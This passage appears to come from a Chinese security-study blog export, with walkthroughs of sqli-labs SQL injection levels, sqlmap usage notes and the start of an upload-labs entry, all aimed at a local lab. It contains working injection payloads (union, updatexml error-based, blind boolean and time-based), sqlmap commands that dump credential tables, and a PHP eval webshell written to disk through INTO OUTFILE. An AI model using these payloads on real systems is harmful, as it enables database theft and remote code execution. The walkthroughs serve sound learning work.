<p>因为updatexml()函数最多只能显示32个字符，所需数据可能无法显示完全，因此需要使用limit限制每行显示一组数据。<br><strong>limit</strong>简单解释：<br>limit 3,1  表示返回从第3行起的1行数据，逗号之前的值对应OFFSET，逗号之后的值对应LIMIT。<br>注意：limit第一个被检索的行是第0行，当检索完后不会显示数据</p>
</li>
</ol>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
<li><p><a href="https://blog.csdn.net/wyzhxhn/article/details/127718995">sqli-labs—–第五关</a></p>
</li>
<li><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_54-57</title>
    <url>/2022/11/19/sqli-labs_54-57/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知识基本都已经学完了，从这里开始就是训练了。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>就像回到了开始~</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1  显示正常</span><br><span class="line">?id=1&#x27;  无错误信息，但显示不正常</span><br></pre></td></tr></table></figure>
<p>推测闭合方式为’</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;order by 4 --+  无错误信息，但显示不正常</span><br><span class="line">?id=1&#x27;order by 3 --+  显示正常</span><br></pre></td></tr></table></figure>
<p>字段数为3</p>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenages&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;8k8nkr7hq5&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(secret_2GAF),3 from 8k8nkr7hq5 --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第55关"><a href="#第55关" class="headerlink" title="第55关"></a>第55关</h2><p>与第54关差不多，闭合方式变更为)</p>
<h2 id="第56关"><a href="#第56关" class="headerlink" title="第56关"></a>第56关</h2><p>与第54关差不多，闭合方式变更为’)</p>
<h2 id="第57关"><a href="#第57关" class="headerlink" title="第57关"></a>第57关</h2><p>与第54关差不多，闭合方式变更为”</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>限制了次数的玩法还挺刺激的hh</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_58-65</title>
    <url>/2022/11/20/sqli-labs_58-65/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续挑战吧</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;  显示报错信息</span><br></pre></td></tr></table></figure>
<p>由此闭合方式为’<br>因为只有5次机会，所以我们采用报错注入比较快</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;challenges&#x27;),0x7e),1) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;6ykqspiws7&#x27; limit 2,1),0x7e),1) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select secret_K2GB from 6ykqspiws7),0x7e),1) --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第59关"><a href="#第59关" class="headerlink" title="第59关"></a>第59关</h2><p>与第58关相比差不多，只是闭合方式没有单引号</p>
<h2 id="第60关"><a href="#第60关" class="headerlink" title="第60关"></a>第60关</h2><p>与第58关相比差不多，只是闭合方式为id&#x3D;-1”)</p>
<h2 id="第61关"><a href="#第61关" class="headerlink" title="第61关"></a>第61关</h2><p>与第58关相比差不多，只是闭合方式为id&#x3D;-1’))</p>
<h2 id="第62关"><a href="#第62关" class="headerlink" title="第62关"></a>第62关</h2><p>时间盲注，闭合方式’)</p>
<h2 id="第63关"><a href="#第63关" class="headerlink" title="第63关"></a>第63关</h2><p>时间盲注，闭合方式’</p>
<h2 id="第64关"><a href="#第64关" class="headerlink" title="第64关"></a>第64关</h2><p>时间盲注，闭合方式))</p>
<h2 id="第65关"><a href="#第65关" class="headerlink" title="第65关"></a>第65关</h2><p>时间盲注，闭合方式”)</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还行</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_7</title>
    <url>/2022/11/08/sqli-labs_7/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关耗费了我好几个小时，究其原因，是大多博客写得不清不楚，或者说自认为清楚，读者(我)却感到很迷惑。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h2><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in…. Use outfile……<br>输入?id&#x3D;1’ 显示：You have an error in your SQL syntax<br>输入?id&#x3D;1’--+  依然报错，说明注入方式不是单纯的单引号<br>输入?id&#x3D;1’’  显示正确，说明是包含了单引号的字符型注入<br>继续不断尝试…<br>最终，输入?id&#x3D;1’))--+  显示正确，注入语句构造成功<br>（说明：这种注入需要不断尝试，并积累经验）</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
<p>可得字段数为3</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由之前的提示信息Use outfile……可知，<br>这里可以利用outfile的文档来查看回显<br>（说明：</p>
</li>
</ol>
<ul>
<li>读取文档：load_file()<br>用法：select load_file(‘文件路径’)</li>
<li>导出文档：into outfile()<br>用法：select ‘string’ into outfile ‘文件路径\\文件名’<br>注意：路径要用双斜线分开）</li>
</ul>
<p><strong>但是！</strong><br>在使用文档之前必须要先获得<strong>权限</strong>。</p>
<ul>
<li>首先，打开sqli-labs使用的MySQL的my.ini。查找secure_file_priv<br>如果存在，那么修改为secure_file_priv&#x3D;””<br>否则，在[mysqld]下，新增为secure_file_priv&#x3D;””</li>
<li>然后，找到刚刚修改的MySQL的bin目录，打开管理员权限的cmd，将cmd的位置转到bin目录下，输入以下指令：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">输入该数据库root用户密码</span><br><span class="line">show variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure>
secure_file_priv 一栏的value为空，即是成功</li>
</ul>
<p>之后就能愉快地获取库名和版本号了,示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;))union select 1,database(),version() into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\database.txt&quot;--+</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;)) UNION SELECT user(),version(),(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot; ) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\table.txt&quot; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;)) UNION SELECT user(),version(),(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot; ) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\columns.txt&quot; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;))  UNION SELECT user(),version(),(select group_concat(username,0x23,password) from users) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\datas.txt&quot; --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h2><p>和第一种的前3步到获得修改文件权限的位置都是一样的。<br>之后是采用<strong>一句话木马</strong>的形式。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27;)) union select 1,&quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\2.txt&quot; --+</span><br></pre></td></tr></table></figure>

<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
<li><a href="https://blog.csdn.net/qq_33598708/article/details/124059514">sqli-labs第七关sql注入流程</a></li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_8</title>
    <url>/2022/11/09/sqli-labs_8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第八关页面只能显示对错，而没有任何其它信息，因此我们可以使用布尔盲注和时间盲注。这里主要来讲讲用<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>如何完成的。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 无任何显示，说明是错误的<br>输入?id&#x3D;1’’  显示：You are in………..<br>输入?id&#x3D;1’--+  显示：You are in………..<br>说明构造成功，且是单引号字符型</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
</li>
</ol>
<ul>
<li>由于无法显示报错信息，我们需要使用length()函数首先判断数据库名长度<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and length(database())&gt;7--+  返回正确</span><br><span class="line">?id=1&#x27;and length(database())&gt;8--+  返回错误</span><br></pre></td></tr></table></figure>
说明数据库名长度为8</li>
<li>接下来便是一个个判断字符，这里可以使用substr(),mid(),substring(),ord(),ascii()等，选择比较多，任意选取即可<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;114--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;115--+   返回错误</span><br></pre></td></tr></table></figure>
说明数据库名第1个字符是s，以此类推，可得数据库名为security<br>数据库版本号也是同理</li>
</ul>
<ol start="3">
<li><p><strong>爆表</strong><br>道理是类似的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;102--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;101--+   返回错误</span><br></pre></td></tr></table></figure>
<p>说明第一个表名的第1个字符是e，以此类推，可以得到所有表名，最终我们发现关键的表名users<br>这里使用limit的原因是因为一个数据库名中表名很可能不止一个，我们需要依次查询</p>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;106--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;105--+   返回错误</span><br></pre></td></tr></table></figure>
<p>说明第一个字段名是i，以此类推，可以得到所有字段名，最终我们发现关键的字段名username,password</p>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;67--+  返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;68--+  返回错误</span><br></pre></td></tr></table></figure>
<p>说明第一个用户名是D，以此类推，可以得到所有用户名和密码。</p>
</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>手动进行布尔注入或时间注入很麻烦，我们只需要理解并记住其原理步骤即可</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/FourthGuy/article/details/108984045">sqli-labs-master第八关</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_9+10</title>
    <url>/2022/11/09/sqli-labs_9+10/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第九关既不能显示正确，也不会显示错误。因此不能使用布尔盲注，只能使用<a href="https://truthnian.github.io/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注</a>。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 显示：You are in………..<br>输入?id&#x3D;1” 显示：You are in………..<br>此时我们应该发现端倪，页面可能不会返回任何信息<br>输入?id&#x3D;1 and sleep(5)--+  页面迅速显示<br>输入?id&#x3D;1’and sleep(5)--+  页面延迟了5s，说明的确是应当使用时间盲注<br>输入?id&#x3D;1’’and sleep(5)--+  页面迅速显示<br>说明是单引号字符型注入</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select database()))&gt;7,sleep(5),1)--+    页面迅速显示</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;8,sleep(5),1)--+    页面延迟了5s</span><br></pre></td></tr></table></figure>
<p>说明数据库名长度是8个字符<br>版本号以此类推</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;115,sleep(5),1)--+   页面迅速显示</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;114,sleep(5),1)--+   页面延迟了5s</span><br></pre></td></tr></table></figure>
<p>最终尝试完后可得数据库名是security</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">如此判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">再逐一判断表名</span><br></pre></td></tr></table></figure>
<p>最终尝试完后可得所需表名为users</p>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名</span><br></pre></td></tr></table></figure>
<p>最终出现了我们所需的字段名username, password</p>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容</span><br></pre></td></tr></table></figure>
<p>最终得到了所需的数据</p>
</li>
</ol>
<h2 id="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"><a href="#第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号" class="headerlink" title="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"></a>第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我终于知道为什么别人写博客，有些关会写得相当简略了，因为都是一样的，确实没意思…</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap使用</title>
    <url>/2022/11/21/sqlmap%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实是有些犹豫，要不要写这一篇的，因为觉得自己学得很浅显。<br>想了想，还是写下来吧。毕竟这个工具我是从一张白纸开始，如果不写笔记，说不定很快会忘记。</p>
<span id="more"></span>
<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>说明：本文以Windows10环境下的sqlmap版本为1.6.11.3为例，对sqlmap的一些基本使用进行讲解。本篇的示例以sqli-labs为主。<br>用法：python sqlmap.py [选项]</p>
<h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><ul>
<li>Windows方式<br><a href="https://sqlmap.org/">官网</a><br>下载zip文件<br>我的是在Windows物理机上安装的，在cmd里执行命令时，需要在开头多输入一个python才能执行。<br>注意cmd运行时，需要将cmd的位置换到该安装目录下才可以。</li>
<li>Linux方式<br>git直接安装<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gitclone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</span><br></pre></td></tr></table></figure></li>
<li>kali及PentestBox默认安装sqlmap</li>
</ul>
<h2 id="基本选项"><a href="#基本选项" class="headerlink" title="基本选项"></a>基本选项</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-h,--help  显示基本帮助信息并退出</span><br><span class="line">-hh    	显示高级帮助信息并退出</span><br><span class="line">--version  显示程序版本信息并退出</span><br><span class="line">-v			VERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</span><br></pre></td></tr></table></figure>

<h2 id="爆破sqli-labs的第1-10关-GET型"><a href="#爆破sqli-labs的第1-10关-GET型" class="headerlink" title="爆破sqli-labs的第1-10关(GET型)"></a>爆破sqli-labs的第1-10关(GET型)</h2><p>首先来示例一下注入语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py --purge   清缓存，可做可不做</span><br><span class="line">在物理机上，一般需要首先输入python，--purge是清除的意思。注意需要两个杠--</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1   判断是否存在注入点</span><br><span class="line">-u的意思是url，即在后面添加所需的url  GET注入时不仅需要url，还需要添加注入点，比如这里的?id=1  </span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1  --dbs --batch   爆破所有数据库</span><br><span class="line">--dbs的意思是database，即爆库  --batch的意思是批处理，即在sqlmap运行时出现选项的时候自动选择默认选项。</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security --tables --batch  爆破security数据库下所有的表</span><br><span class="line">-D意思是database，即在什么数据库下扫描   --tables即为爆数据表</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security -T users --columns --batch   爆字段名</span><br><span class="line">-T意思是tables，后面跟所需扫描的表  --columns即为爆字段名</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; -D database() -T users -C &quot;id,username,password&quot; --dump --batch   爆数据</span><br><span class="line">-C意思是columns，后面跟所需要扫描的字段名  --dump意思是转储，即显示数据</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>在执行过程中根据数据大小和注入方式等的不同，会导致扫描时间不同，耐心等待即可。如果一个扫描超出预计等待时间，通常可能哪里弄错了，关了和重新打开尝试即可。</li>
<li>扫描得到的数据通常会以表的形式显示出来</li>
<li>常用英文说明<br>boolean-based blind: 布尔盲注<br>error-based: 报错注入<br>AND&#x2F;OR time-based blind: 时间盲注<br>UNION query: 联合注入</li>
</ul>
<h2 id="爆破sqli-labs的第11-17关-POST型"><a href="#爆破sqli-labs的第11-17关-POST型" class="headerlink" title="爆破sqli-labs的第11-17关(POST型)"></a>爆破sqli-labs的第11-17关(POST型)</h2><p>首先来示例一下注入语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; --dbs --batch   爆破所有数据库</span><br><span class="line">POST注入时在后面添加index.php, --data意思是通过POST发送参数，后面是具体需要发送的参数</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; -D security --tables --batch   爆破security数据库下所有的表</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; -D security -T users --columns --batch</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; -D security -T users -C id,username,password --dump --batch</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>除了发送参数有区别，其它都没什么区别</li>
</ul>
<h2 id="爆破sqli-labs的第18关-User-Agent注入"><a href="#爆破sqli-labs的第18关-User-Agent注入" class="headerlink" title="爆破sqli-labs的第18关(User-Agent注入)"></a>爆破sqli-labs的第18关(User-Agent注入)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --user-agent=&quot;*&quot; --thread=10 --dbs --batch  爆破数据库</span><br><span class="line">这里不再需要在url后面添加index.php了   user-agent是用户代理，注入点在这里，因此选择这里注入  --thread=10 意思是线程数为10，表示运行快慢，太高容易被检测到，不宜高线程</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>除了发送参数有区别，其它都没什么区别，依葫芦画瓢即可</li>
</ul>
<h2 id="爆破sqli-labs的第19关-Referer注入"><a href="#爆破sqli-labs的第19关-Referer注入" class="headerlink" title="爆破sqli-labs的第19关(Referer注入)"></a>爆破sqli-labs的第19关(Referer注入)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --referer=&quot;*&quot; --thread=10 --dbs --batch  爆破数据库</span><br><span class="line">参数改为referer罢了，思路相同</span><br></pre></td></tr></table></figure>

<h2 id="爆破sqli-labs的第20关-Cookie注入"><a href="#爆破sqli-labs的第20关-Cookie注入" class="headerlink" title="爆破sqli-labs的第20关(Cookie注入)"></a>爆破sqli-labs的第20关(Cookie注入)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --cookie=&quot;uname=admin&quot; --dbs --batch  爆破数据库</span><br><span class="line">参数改为cookie，差别不大</span><br></pre></td></tr></table></figure>

<h2 id="爆破sqli-labs的第21关-Cookie注入"><a href="#爆破sqli-labs的第21关-Cookie注入" class="headerlink" title="爆破sqli-labs的第21关(Cookie注入)"></a>爆破sqli-labs的第21关(Cookie注入)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --cookie=&quot;uname=*&quot; --dbs --tamper &quot;base64encode.py&quot; --batch  爆破数据库</span><br></pre></td></tr></table></figure>

<h2 id="爆破sqli-labs的第21关-Cookie注入-1"><a href="#爆破sqli-labs的第21关-Cookie注入-1" class="headerlink" title="爆破sqli-labs的第21关(Cookie注入)"></a>爆破sqli-labs的第21关(Cookie注入)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>第18关整半天弄不出来，也不知道什么原因，气死了。<br>所以这次就先写到17关了，以后有机会再补完。</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_1</title>
    <url>/2022/11/23/upload-labs_1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>作为上传漏洞的第一关，啥都没了解就开始做还是遇到了一些障碍。</p>
<span id="more"></span>
<h1 id="upload的大致思路图"><a href="#upload的大致思路图" class="headerlink" title="upload的大致思路图"></a>upload的大致思路图</h1><p><img src="/simg/upload-labs_1.png" alt=" "></p>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><ol>
<li><p>测试<br>看到任务，是上传一个webshell到服务器。<br>首先尝试上传，选择png文件，上传成功<br>然后选择txt文件，出现报错，显示只能上传jpg,png,gif的文件。<br>于是我们可以先把想要上传的文件改为允许类型，再抓包改文件后缀，实现shell的上传。</p>
</li>
<li><p>尝试与抓包<br>把写有 <code>&lt;?php phpinfo(); ?&gt;</code> 代码的txt文件改文件名为a.png。<br>提交后burp抓包，得到包的内容后，把包里的所有png改为php，之后放包，我们就可以看到文件上传成功了。<br>再打开网址测试 <code>127.0.0.1/upload-labs/upload/a.php</code><br>页面显示成功，那么说明我们的思路没问题。</p>
</li>
<li><p>上传webshell</p>
